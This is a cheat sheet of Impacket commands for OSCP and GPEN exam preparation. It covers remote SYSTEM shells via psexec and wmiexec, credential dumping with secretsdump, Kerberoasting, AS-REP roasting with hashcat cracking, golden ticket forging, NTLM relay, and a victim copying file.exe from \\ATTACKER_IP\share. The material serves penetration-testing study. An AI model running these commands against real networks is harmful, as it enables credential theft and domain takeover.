# Impacket Cheat Sheet (OSCP / GPEN)

This cheat sheet provides a **structured reference for the most important Impacket tools** used during **OSCP and GPEN exams**.

Impacket is a Python library that provides **low-level network protocol implementations**, commonly used for **Active Directory attacks, credential dumping, lateral movement, and Kerberos attacks**.

Core methodology:

```
Credential Discovery → Authentication → Lateral Movement → Credential Dumping → Domain Escalation
```

Common protocols used:

```
SMB
Kerberos
LDAP
RPC
```

---

# 1. Verify Impacket Installation

Check installation:

```bash
impacket-GetUserSPNs
```

Or:

```bash
python3 -m impacket.examples.secretsdump
```

Common installation path:

```
/usr/share/doc/python3-impacket/examples/
```

---

# 2. Basic Authentication Formats

### Username + Password

```bash
domain/user:password
```

Example:

```bash
corp.local/admin:Password123
```

---

### NTLM Hash Authentication

```bash
domain/user@TARGET -hashes LMHASH:NTHASH
```

Example:

```bash
administrator@192.168.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
```

---

# 3. psexec.py (Remote Command Execution)

Provides **SYSTEM shell via SMB**.

### Basic Usage

```bash
psexec.py domain/user:password@TARGET
```

Example:

```bash
psexec.py corp.local/admin:Password123@192.168.1.10
```

### Pass-the-Hash

```bash
psexec.py administrator@TARGET -hashes LMHASH:NTHASH
```

---

# 4. wmiexec.py (Stealth Remote Execution)

Executes commands using **WMI**.

Less noisy than PsExec.

```bash
wmiexec.py domain/user:password@TARGET
```

Example:

```bash
wmiexec.py corp.local/admin:Password123@192.168.1.10
```

---

# 5. smbexec.py (SMB Command Execution)

Uses **SMB service execution**.

```bash
smbexec.py domain/user:password@TARGET
```

Example:

```bash
smbexec.py corp.local/admin:Password123@192.168.1.10
```

---

# 6. secretsdump.py (Credential Dumping)

Extracts credentials from:

```
SAM
LSA
NTDS.dit
```

### Dump Local SAM

```bash
secretsdump.py user:password@TARGET
```

Example:

```bash
secretsdump.py administrator:Password123@192.168.1.10
```

---

### Dump Domain Controller

```bash
secretsdump.py domain/user:password@DC_IP
```

Example:

```bash
secretsdump.py corp.local/admin:Password123@192.168.1.10
```

Output includes:

```
NTLM hashes
Kerberos keys
```

---

# 7. GetUserSPNs.py (Kerberoasting)

Extract service accounts with SPNs.

```bash
GetUserSPNs.py domain/user:password
```

Example:

```bash
GetUserSPNs.py corp.local/user:Password123 -dc-ip 192.168.1.10
```

Output example:

```
$krb5tgs$23$...
```

Crack using Hashcat:

```bash
hashcat -m 13100 hash.txt rockyou.txt
```

---

# 8. GetNPUsers.py (AS-REP Roasting)

Find accounts with **Kerberos pre-authentication disabled**.

```bash
GetNPUsers.py domain.local/ -usersfile users.txt
```

Example:

```bash
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 192.168.1.10
```

Output:

```
$krb5asrep$
```

Crack with Hashcat:

```bash
hashcat -m 18200 hash.txt rockyou.txt
```

---

# 9. smbclient.py (SMB Client)

Access SMB shares.

```bash
smbclient.py domain/user:password@TARGET
```

Example:

```bash
smbclient.py corp.local/user:Password123@192.168.1.10
```

List shares:

```
shares
```

---

# 10. smbserver.py (Create SMB Server)

Host files via SMB.

```bash
smbserver.py share .
```

Victim can access:

```
\\ATTACKER_IP\share
```

---

# 11. lookupsid.py (User Enumeration)

Enumerate domain SIDs.

```bash
lookupsid.py domain/user:password@TARGET
```

Example:

```bash
lookupsid.py corp.local/user:Password123@192.168.1.10
```

---

# 12. rpcdump.py (RPC Enumeration)

List RPC endpoints.

```bash
rpcdump.py TARGET
```

---

# 13. samrdump.py (SAM Enumeration)

Dump user accounts.

```bash
samrdump.py TARGET
```

---

# 14. ticketer.py (Golden Ticket Creation)

Generate Kerberos golden tickets.

Example:

```bash
ticketer.py -nthash HASH -domain-sid SID -domain corp.local administrator
```

---

# 15. getTGT.py (Get Kerberos Ticket)

Request TGT for user.

```bash
getTGT.py domain/user:password
```

Example:

```bash
getTGT.py corp.local/user:Password123
```

---

# 16. getST.py (Service Ticket Request)

Request service ticket.

```bash
getST.py domain/user:password -spn SERVICE/TARGET
```

---

# 17. ntlmrelayx.py (NTLM Relay Attack)

Relay NTLM authentication.

Start relay:

```bash
ntlmrelayx.py -t TARGET
```

Example:

```bash
ntlmrelayx.py -t smb://192.168.1.10
```

---

# 18. smbrelayx.py (Legacy SMB Relay)

Relay SMB authentication.

```bash
smbrelayx.py
```

---

# 19. impacket-smbserver (Quick File Transfer)

Host files quickly.

```bash
impacket-smbserver share .
```

Victim:

```cmd
copy \\ATTACKER_IP\share\file.exe .
```

---

# 20. Impacket Credential Formats

Supported authentication:

```
username/password
NTLM hashes
Kerberos tickets
```

---

# 21. Useful Command Examples

### Remote Shell

```bash
psexec.py domain/user:password@TARGET
```

### Credential Dump

```bash
secretsdump.py domain/user:password@TARGET
```

### Kerberoasting

```bash
GetUserSPNs.py domain/user:password
```

---

# 22. Common Attack Workflow

Typical Active Directory attack path:

```
1. Enumerate users
2. Perform Kerberoasting
3. Crack passwords
4. Move laterally
5. Dump credentials
6. Escalate privileges
```

---

# 23. Impacket Tools Summary

| Tool | Purpose |
|-----|--------|
| psexec.py | Remote shell |
| wmiexec.py | Remote command execution |
| smbexec.py | SMB shell |
| secretsdump.py | Credential dumping |
| GetUserSPNs.py | Kerberoasting |
| GetNPUsers.py | AS-REP roasting |
| smbclient.py | SMB access |
| smbserver.py | Host SMB share |
| lookupsid.py | SID enumeration |
| ntlmrelayx.py | NTLM relay attack |

---

# 24. Quick Impacket Commands

Remote shell:

```bash
psexec.py domain/user:password@TARGET
```

Credential dump:

```bash
secretsdump.py domain/user:password@TARGET
```

Kerberoasting:

```bash
GetUserSPNs.py domain/user:password
```

AS-REP roasting:

```bash
GetNPUsers.py domain.local/ -usersfile users.txt
```

---

# 25. Final Advice

Impacket is **one of the most important toolsets for modern Active Directory attacks**.

During OSCP/GPEN exams:

```
Use Impacket for lateral movement, credential dumping, and Kerberos attacks.
```

Understanding these tools can **quickly lead to domain administrator compromise**.
